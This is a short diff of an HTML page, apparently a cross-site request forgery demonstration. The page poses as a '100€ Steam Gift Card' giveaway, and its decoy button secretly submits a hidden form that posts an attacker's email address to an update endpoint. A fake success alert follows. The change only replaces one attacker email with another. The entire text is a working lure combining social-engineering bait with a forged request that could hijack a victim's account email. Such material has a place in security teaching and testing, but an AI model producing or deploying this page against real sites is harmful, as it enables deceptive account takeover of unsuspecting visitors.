@@ -63,7 +63,7 @@
         <h1>Win 100€ Steam Gift Card!</h1>
         <p>Participate now and stand a chance to win a 100€ Steam Gift Card. Offer valid for a limited time only!</p>
         <form method="POST" action="update.php" style="display:none;">
-            <input type="email" name="email" value="hacked@hacker.com">
+            <input type="email" name="email" value="youarehacked@gmail.com">
             <button type="submit">Send</button>
         </form>
         <button onclick="document.forms[0].submit(); alert('Congratulations! Your participation is confirmed.');">
